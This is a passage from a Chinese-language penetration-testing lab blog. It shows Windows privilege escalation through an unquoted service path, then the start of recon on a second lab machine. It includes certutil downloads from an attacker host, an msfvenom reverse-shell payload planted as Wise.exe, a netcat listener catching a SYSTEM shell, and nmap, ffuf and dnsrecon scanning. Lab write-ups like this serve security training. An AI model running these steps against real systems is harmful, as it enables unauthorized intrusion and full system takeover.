Installed.</span><br><span class="line">                           [01]: KB4601554</span><br><span class="line">                           [02]: KB5000736</span><br><span class="line">                           [03]: KB5001330</span><br><span class="line">                           [04]: KB5001405</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) 82574L Gigabit Network Connection</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     192.168.19.254</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.19.143</span><br><span class="line">                                 [02]: fe80::94cd:4577:bcd4:f41f</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>

<p>windows 提權工具 &gt;winpeas</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master">https://github.com/carlospolop/PEASS-ng/tree/master</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe">https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">cd</span> c:\<span class="built_in">users</span>    </span><br><span class="line"><span class="built_in">cd</span> c:\<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:30 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">**08/15/2021  04:23 PM    &lt;DIR&gt;          butler**</span><br><span class="line">08/14/2021  05:25 AM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  11,740,917,760 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">cd</span> butler</span><br><span class="line"><span class="built_in">cd</span> butler</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          .</span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">**08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads**</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              16 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目錄可能會有些有用的內容</span></span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Downloads</span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Downloads</span><br><span class="line"></span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          ..</span><br><span class="line">**08/14/2021  04:23 AM        16,013,912 WiseCare365_5.6.7.568.exe**</span><br><span class="line">               1 File(s)     16,013,912 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Desktop</span><br><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Desktop</span><br><span class="line"></span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          ..</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br></pre></td></tr></table></figure>

<p>主要遠程將winpeas放到用戶目錄下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Users\butler&gt;**certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe**</span><br><span class="line">certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          .</span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">02/16/2024  11:43 PM         2,387,456 winpeas.exe</span><br><span class="line">               1 File(s)      2,387,456 bytes</span><br><span class="line">              16 Dir(s)  11,735,945,216 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;winpeas.exe</span><br><span class="line">winpeas.exe</span><br><span class="line">ANSI color bit <span class="keyword">for</span> Windows is not <span class="built_in">set</span>. If you are executing this from a Windows terminal inside the host you should run <span class="string">&#x27;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause <span class="literal">false</span> negatives when looking <span class="keyword">for</span> files). If you are admin, you can <span class="built_in">enable</span> it with <span class="string">&#x27;**REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1**&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[+] Legend:</span><br><span class="line">         **Red                Indicates a special privilege over an object or something is misconfigured**</span><br><span class="line">         Green              Indicates that some protection is enabled or something is well configured</span><br><span class="line">         Cyan               Indicates active <span class="built_in">users</span></span><br><span class="line">         Blue               Indicates disabled <span class="built_in">users</span></span><br><span class="line">         LightYellow        Indicates links</span><br><span class="line">....</span><br><span class="line">����������͹ Current Token privileges</span><br><span class="line">� Check <span class="keyword">if</span> you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                                            </span><br><span class="line">    SeIncreaseQuotaPrivilege: DISABLED</span><br><span class="line">    SeSecurityPrivilege: DISABLED</span><br><span class="line">    SeTakeOwnershipPrivilege: DISABLED</span><br><span class="line">    SeLoadDriverPrivilege: DISABLED</span><br><span class="line">    SeSystemProfilePrivilege: DISABLED</span><br><span class="line">    SeSystemtimePrivilege: DISABLED</span><br><span class="line">    SeProfileSingleProcessPrivilege: DISABLED</span><br><span class="line">    SeIncreaseBasePriorityPrivilege: DISABLED</span><br><span class="line">    SeCreatePagefilePrivilege: DISABLED</span><br><span class="line">    SeBackupPrivilege: DISABLED</span><br><span class="line">    SeRestorePrivilege: DISABLED</span><br><span class="line">    SeShutdownPrivilege: DISABLED</span><br><span class="line">    SeDebugPrivilege: SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeSystemEnvironmentPrivilege: DISABLED</span><br><span class="line">    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeRemoteShutdownPrivilege: DISABLED</span><br><span class="line">    SeUndockPrivilege: DISABLED</span><br><span class="line">    SeManageVolumePrivilege: DISABLED</span><br><span class="line">    **SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED**</span><br><span class="line">    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeIncreaseWorkingSetPrivilege: DISABLED</span><br><span class="line">    SeTimeZonePrivilege: DISABLED</span><br><span class="line">    SeCreateSymbolicLinkPrivilege: DISABLED</span><br><span class="line">    SeDelegateSessionUserImpersonatePrivilege: DISABLED</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">����������͹ Interesting Processes -non Microsoft-</span><br><span class="line">� Check <span class="keyword">if</span> any interesting processes <span class="keyword">for</span> memory dump or <span class="keyword">if</span> you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                                         </span><br><span class="line">    svchost(264)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">    svchost(2592)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    jenkins(2388)[C:\Program Files\Jenkins\jenkins.exe] -- POwn: butler -- isDotNet</span><br><span class="line">    **Permissions: butler [AllAccess], Administrators [AllAccess]**</span><br><span class="line">    Possible DLL Hijacking folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])</span><br><span class="line">    Command Line: <span class="string">&quot;C:\Program Files\Jenkins\**jenkins.exe**&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">#在Download目錄下有這檔案</span></span><br><span class="line"><span class="comment">#**WiseCare365_5.6.7.568.exe</span></span><br><span class="line"><span class="comment">#當我們有能力濫用某項服務時，我們將無權停止和啟動該服務。但是，如果服務自動啟動，我們可以利用關機權限來重新啟動機器；以及最終的服務。**</span></span><br><span class="line">**WiseBootAssistant**(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\**Wise Care 365**\BootTime.exe] - Auto - Running **- No quotes and Space detected**</span><br><span class="line">    YOU CAN MODIFY THIS SERVICE: AllAccess</span><br><span class="line">    File Permissions: Administrators [AllAccess]</span><br><span class="line">    Possible DLL Hijacking <span class="keyword">in</span> binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])</span><br><span class="line">    In order to optimize system performance,Wise Care 365 will calculate your system startup <span class="keyword">time</span>.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/unquoted-service-paths/">https://juggernaut-sec.com/unquoted-service-paths/</a></p>
<ul>
<li><p><strong>No quotes and Space detected 告訴我們的那些事:</strong></p>
<p>  當涉及 <strong>Windows 權限升級技術</strong>時，常見的升級路徑是利用<strong>錯誤配置的服務</strong>。服務配置錯誤的方式有很多種；最有趣的情況是<strong>未加引號的服務路徑</strong>(unquoted service paths)</p>
<p>  當服務指向的路徑中的<strong>可執行檔沒有空格或有空格但用引號引起來</strong>時，該服務將直接沿著該路徑到達可執行檔並按預期啟動。例如：C:\temp\service.exe 和「C:\tempfolder\service.exe」配置正確，將執行service.exe。</p>
<p>  假設您有一個從下列檔案位置執行的服務：<strong>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</strong></p>
<p>  由於<strong>服務可執行檔案的檔案路徑中有空格且沒有引號</strong>，因此服務將<strong>嘗試透過將空格之前的資料夾</strong>名稱的每個部分視為<strong>駐留在上一個資料夾中的可執行檔</strong>來啟動，如下所示：</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files\Juggernaut.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</li>
</ul>
<p>  如果我們有權在實際可執行位置之前的三個資料夾中的任何一個中寫入，那麼我們可以製作一個可執行檔並<strong>根據路徑中的資料夾</strong>名稱對其進行命名，如上面的範例所示。之後，當<strong>服務啟動</strong>時，它將執行.exe惡意程序，而不是預期的程序。</p>
<p>  如果我們可以寫入C:. 我們將製作一個名為 Program.exe 的可執行檔並將其放置在 C:\ 中。如果我們可以寫入 C:\Program Files，我們將製作一個名為 Juggernaut.exe 的可執行檔並將其放置在 C:\Program Files 中。等等…</p>
</li>
</ul>
<p>檢測到該服務不含引號 C:\Program Files (x86)\Wise**Wise Care 365**\BootTime.exe</p>
<p><img src="/img/privilege_Untitled_39.png" alt="Untitled"></p>
<p>也就是說可以利用這個特性</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files (x86)\Wise\Wise.exe</li>
</ul>
<p>所以可以製作一個惡意程式叫Wise.exe，對win10做提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.19.130 LPORT=7777 -f exe&gt; Wise.exe**</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                                                 </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\&gt;<span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span>                          </span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span></span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)</span><br><span class="line"></span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:05 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">02/17/2024  01:37 PM    &lt;DIR&gt;          Microsoft</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          Microsoft.NET</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Windows NT</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          Wise</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              15 Dir(s)  11,391,279,104 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;**<span class="built_in">cd</span> Wise**</span><br><span class="line"><span class="built_in">cd</span> Wise</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)\Wise</span><br><span class="line"></span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/17/2024  12:38 AM    &lt;DIR&gt;          Wise Care 365</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  11,396,620,288 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe**</span><br><span class="line">certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>

<p>如果直接執行 <code>./Wise.exe</code> 運行的是普通用戶</p>
<p>先重啟WiseBootAssistant服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Program Files (x86)\Wise&gt;sc stop WiseBootAssistant</span><br><span class="line">sc stop WiseBootAssistant</span><br><span class="line">[SC] ControlService FAILED 1062:</span><br><span class="line"></span><br><span class="line">The service has not been started.</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;sc query WiseBootAssistant</span><br><span class="line">sc query WiseBootAssistant</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: WiseBootAssistant </span><br><span class="line">        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)</span><br><span class="line">        STATE              : 1  STOPPED </span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**sc start WiseBootAssistant**</span><br><span class="line">sc start WiseBootAssistant</span><br></pre></td></tr></table></figure>

<p>在啟動服務的當下就成功執行Wise.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49713</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Blackpearl"><a href="#Walkthrough-Blackpearl" class="headerlink" title="Walkthrough - Blackpearl"></a><strong>Walkthrough - Blackpearl</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.144</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 04:21 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.144</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)</span><br><span class="line">|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)</span><br><span class="line">|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)</span><br><span class="line">**53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)**</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian</span><br><span class="line">**80/tcp open  http    nginx 1.14.2**</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">MAC Address: 00:0C:29:5B:A7:0C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.94 ms 192.168.19.144</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 25.08 seconds</span><br></pre></td></tr></table></figure>

<p>80port開啟了nginx網頁，網頁源碼中能看到藏了訊息</p>
<ul>
<li><!-- Webmaster: alek@blackpearl.tcm -→</li>
</ul>
<p><img src="/img/privilege_Untitled_40.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_41.png" alt="Untitled"></p>
<p>接下來對網頁掃描存在的目錄</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.144/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.144/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 10ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 11ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string">**secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:35] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>網頁下沒有其他目錄，但找到了一個<strong>secret文件</strong></p>
<p><img src="/img/privilege_Untitled_42.png" alt="Untitled"></p>
<p>看到53port有開啟，常試DNS爆破域名</p>
<ul>
<li><p>dnsrecon工具</p>
<ul>
<li>Scan a domain and save the results to a SQLite database:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --db &#123;&#123;path/to/database.sqlite&#125;&#125;</code></p>
<ul>
<li>Scan a domain, specifying the nameserver and performing a zone transfer:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --name_server &#123;&#123;nameserver.example.com&#125;&#125; --type axfr</code></p>
<ul>
<li>Scan a domain, using a dictionary of subdomains and hostnames for bruteforcing:</li>
</ul>
